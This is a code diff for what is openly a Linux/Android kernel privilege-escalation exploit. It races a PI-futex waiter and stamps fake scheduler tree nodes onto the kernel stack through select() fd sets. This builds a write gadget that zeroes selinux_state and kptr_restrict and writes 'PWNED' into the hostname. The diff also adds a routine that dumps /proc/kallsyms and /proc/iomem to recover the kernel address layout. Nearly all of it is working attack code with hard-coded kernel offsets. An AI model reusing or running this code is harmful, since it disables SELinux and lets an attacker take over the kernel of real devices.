@@ -329,14 +329,18 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               (unsigned long long)init_task);
     } else {
       uint64_t pi_parent = 0, pi_right = 0, pi_left = 0;
-      uint64_t stack_task = sc_task_override ? sc_task_override : init_task;
+      /* word8 = init_task: its on_rq==1 makes the post-erase
+       * wake_up_process a ttwu fast-path no-op (F27-proven safe). A
+       * zeroed fake task reaches p->sched_class->task_woken == NULL. */
+      uint64_t stack_task = init_task;
       if (pselect_custom_write == 4 && fake_fops) {
         uint64_t misc_off =
             (active_offsets && active_offsets->off_ashmem_misc_fops)
                 ? active_offsets->off_ashmem_misc_fops
                 : ASHMEM_MISC_FOPS_OFF;
         uint64_t misc = data_addr(KIMAGE_TEXT_BASE + misc_off);
-        stack_task = init_task;
+        if (!sc_task_override)
+          stack_task = init_task;
         if (env_flag("MODE4_TASK_FAKE", 0))
           stack_task = fake_task;
 
@@ -465,25 +469,44 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
           uint64_t tail = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
               (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0));
-          uint64_t tgt_off = (ph == 1) ? 0x029C9D20ULL
-                                 : (ph == 2 ? 0x027BCF68ULL : 0x02A793C8ULL);
-          tree_pc = 0;              /* value = 0 */
-          if (ph == 4) {
-            /* visible oracle: magic into bootid proves stores landed */
+          /* ph1: selinux_state qword0 = 0 | ph2: kptr_restrict = 0
+           * ph3/ph5: bootid oracle (plain store; ph5 prio=139 [3]-exit)
+           * ph6: hostname oracle — "PWNED\0" into init_uts_ns.nodename
+           *      (shell-readable, harmless, persists; live/dead truth) */
+          uint64_t tgt_off = (ph == 1) ? 0x02A793C8ULL : 0x027BCF68ULL;
+          uint64_t tgt = (uint64_t)data_addr(KIMAGE_TEXT_BASE + tgt_off);
+          if (ph == 3 || ph == 5) {
             uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
                                    ? (uint64_t)active_offsets->off_slide_boot_id
                                    : SLIDE_SYSCTL_BOOTID_OFF;
-            tree_pc = tail + 0x40;
-            tgt_off = bid_off;
+            tgt = (uint64_t)data_addr(KIMAGE_TEXT_BASE + bid_off);
           }
-          tree_r = 0;
-          tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + tgt_off);
+          if (ph == 3 || ph == 5) {
+            /* oracle: plain store (F27-proven shape); ph5 = prio-equal
+             * early-exit probe ([3] exit, no erase, no wake) */
+            tree_pc = tail + 0x40;
+            tree_r = 0;
+            tree_l = tgt;
+          } else if (ph == 6) {
+            tree_pc = 0x00000044574E5057ULL; /* "PWNED\0" */
+            tree_r = 0;
+            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x027CBDF1ULL);
+          } else {
+            /* ZERO-WRITE gadget: pc=(tgt-8)|1 (red: no rebalance),
+             * left=right=0 -> Case-1-no-child -> change_child else-branch
+             * WRITE_ONCE(parent->rb_right = tgt, NULL) -> *(tgt)=0.
+             * Root untouched (parent non-NULL) -> enqueue sees empty tree. */
+            tree_pc = (tgt - 8) | 1;
+            tree_r = 0;
+            tree_l = 0;
+          }
           pi_parent = 0; pi_right = 0; pi_left = 0;
-          stack_prio = 3;
+          stack_prio = (ph == 5) ? 139 : 3;
           stack_deadline = 0;
           stack_lock = tail + 0x400 + (uint64_t)(ph - 1) * 0x20;
-          pr_info("stack mode4 SC_UMASK ph=%d *(%016llx)=0\n",
-                  ph, (unsigned long long)tree_l);
+          pr_info("stack mode4 SC_UMASK ph=%d tgt=%016llx val=%016llx\n",
+                  ph, (unsigned long long)tree_l,
+                  (unsigned long long)tree_pc);
         } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
             env_flag("MODE4_SC_TRAP3", 0)) {
           /* ERASE-EXECUTION trap: parent_color = text|1 -> Case-1-else's
@@ -1317,7 +1340,7 @@ void do_pselect_fake_lock_route(void) {
   int sc = env_flag("MODE4_STATIC_CHAIN", 0);
   int vs_retries = 0; /* reclaim-loss retries consumed by VERIFY_SWAP */
   const int VS_MAX_RECLAIM_RETRIES = 4;
-  int max_att = env_flag("MODE4_SC_UMASK", 0) ? 4 : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : (vs ? 2
+  int max_att = env_flag("MODE4_SC_UMASK", 0) ? 3 : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : (vs ? 2
                    : (pad3 ? 3
                           : (zio || chain ? 3
                                          : ((zion || zi || wion)
@@ -1828,6 +1851,160 @@ void do_pselect_fake_lock_route(void) {
   }
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, cfi_last_step, cfi_last_errno);
+}
+
+/* ------------------------------------------------------------------ */
+/* MODE4_SELFSTAMP — Quest3-style continuous self-stamping route.      */
+/*                                                                     */
+/* The single-blocking-pselect design left a 5-50ms window after the   */
+/* WRPI timeout during which the dangling pi_blocked_on pointed at an  */
+/* UNSTAMPED stack residue (a live boot's kernel walk in that window   */
+/* crashes on the stale residue). Here the waiter instead RE-STAMPS    */
+/* its own kernel stack in a tight pselect(timeout=0) loop, starting   */
+/* microseconds after the WRPI return, and the consumer fires into a  */
+/* continuously refreshed stamp. All fd setup is PRE-STAGED before the */
+/* WRPI call so the post-timeout path is pure syscall entries.         */
+/* ------------------------------------------------------------------ */
+static int ss_pipefd[2] = {-1, -1};
+static int ss_block_fd = -1;
+static int ss_high_read = -1;
+
+int selfstamp_prestage(void) {
+  if (pipe(ss_pipefd) != 0)
+    return -1;
+  ss_block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+  if (ss_block_fd < 0)
+    ss_block_fd = ss_pipefd[0];
+  ss_high_read = fcntl(ss_block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+  if (ss_high_read < 0)
+    return -1;
+  /* OPEN_ALL policy: every fd in [0, NFDS) dup'd so ANY stamp bit
+   * pattern is valid for select (no EBADF short-circuits). stdout is
+   * saved and restored so console logging survives the fd sweep. */
+  int saved_out = dup(1);
+  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++)
+    dup2(ss_high_read, fd);
+  if (saved_out >= 0) {
+    dup2(saved_out, 1);
+    close(saved_out);
+  }
+  pr_info("SELFSTAMP prestage ok: all %d fds open (pipe/timerfd dup)\n",
+          PSELECT_ROUTE_NFDS);
+  return 0;
+}
+
+void selfstamp_route(void) {
+  if (!page_base || !fake_lock || !fake_fops) {
+    pr_error("selfstamp route missing kernel page\n");
+    return;
+  }
+  int sc = env_flag("MODE4_STATIC_CHAIN", 0);
+  int max_ph = env_flag("MODE4_SC_UMASK", 0) ? 3
+             : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : 2));
+  /* SELFSTAMP_SINGLE=N: run ONLY phase N this fire (one walk per boot —
+   * multi-phase interference crashes phase 2's stamp window). The next
+   * fire on the SAME boot creates a fresh dangling for the next phase. */
+  int single = env_int_range("SELFSTAMP_SINGLE", 0, 0, 7);
+  int ph_start = single ? single : 1;
+  int ph_end = single ? single : max_ph;
+  struct timeval tv0 = {0, 0};
+  for (int ph = ph_start; ph <= ph_end; ph++) {
+    g_mode4_chain_phase = ph;
+    fd_set in, out, ex;
+    prepare_pselect_fdsets(&in, &out, &ex);
+    /* arm the consumer for this phase (its 50ms delay elapses while
+     * the stamp below is being continuously refreshed) */
+    atomic_store(&consumer_calls, 0);
+    atomic_store(&consumer_success, 0);
+    atomic_store(&punch_consume_stop, 0);
+    atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
+    atomic_store(&punch_consume_go, ph);
+    durable_proof_log("ss_phase_armed");
+    if (ph == 1 && !env_flag("SELFSTAMP_NOUNLOCK", 0)) {
+      /* MID-STAMP unlock (Quest3 Step-3 repositioned): the first select
+       * below places the stamp, THEN we release f_pi_chain — the
+       * unlock's deboost walk reads our stamped words (not the raw
+       * residue) and preserves the dangling for the consumer's walk. */
+      select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
+      futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+      durable_proof_log("ss_midstamp_unlock");
+    }
+    /*
+     * Deterministic handoff: stamp-spin for ~delay-10ms, one FINAL
+     * stamp, then go QUIESCENT (vDSO clock + sched_yield only — no
+     * deep syscalls) so the consumer's walk reads a STABLE stamp and
+     * the walk's own writes to these words (rb_link_node) cannot be
+     * torn by a concurrent fdset re-copy.
+     */
+    struct timespec ts0;
+    clock_gettime(CLOCK_MONOTONIC, &ts0);
+    long spin_us = (main_route_delay_usec > 20000)
+                       ? (atomic_load(&main_route_delay_usec) - 10000L)
+                       : 10000L;
+    for (;;) {
+      select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
+      struct timespec tsn;
+      clock_gettime(CLOCK_MONOTONIC, &tsn);
+      long el = (tsn.tv_sec - ts0.tv_sec) * 1000000L +
+                (tsn.tv_nsec - ts0.tv_nsec) / 1000;
+      if (el >= spin_us)
+        break;
+    }
+    /*
+     * FINAL STAMP = ONE LONG BLOCKING select (F27's winning shape): the
+     * waiter blocks on the never-ready timerfd for seconds — the fdset
+     * stamp is perfectly STABLE while the consumer's walk (and any
+     * kernel-side PI walk) reads it. No tearing, no pre-window: the
+     * spin above already covered the dangling-live-unstamped gap.
+     */
+    {
+      struct timeval tvb = {.tv_sec = 1, .tv_usec = 0};
+      select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tvb);
+    }
+    /*
+     * Dying-box harvester: the moment the walk starts, dump every
+     * slide source with per-chunk fsync to /data/local/tmp (persists
+     * across softboot). If the selinux/kptr zero landed, these open —
+     * even a partial dump that survives the crash yields the slide.
+     */
+    {
+      const char *srcs[] = {"/proc/kallsyms", "/proc/iomem"};
+      for (size_t si = 0; si < 2; si++) {
+        int in = open(srcs[si], O_RDONLY | O_CLOEXEC);
+        if (in < 0)
+          continue;
+        char op[128];
+        snprintf(op, sizeof(op), "/data/local/tmp/harvest_%zu.txt", si);
+        int of = open(op, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+        if (of < 0) {
+          close(in);
+          continue;
+        }
+        char buf[4096];
+        ssize_t rn;
+        size_t total = 0;
+        while (total < 2u * 1024 * 1024 &&
+               (rn = read(in, buf, sizeof(buf))) > 0) {
+          ssize_t wn = write(of, buf, (size_t)rn);
+          if (wn <= 0)
+            break;
+          total += (size_t)wn;
+        }
+        close(of);
+        close(in);
+        pr_info("SELFSTAMP harvest %s -> %s (%zu bytes)\n",
+                srcs[si], op, total);
+      }
+    }
+    atomic_store(&punch_consume_go, 0);
+    char b[64];
+    snprintf(b, sizeof(b), "ss_phase_%d_done calls=%d", ph,
+             atomic_load(&consumer_calls));
+    durable_proof_log(b);
+    pr_info("SELFSTAMP phase %d: calls=%d success=%d\n", ph,
+            atomic_load(&consumer_calls), atomic_load(&consumer_success));
+  }
+  durable_proof_log("ss_route_complete");
 }
 
 int repair_fake_fops_llseek(int fd) {
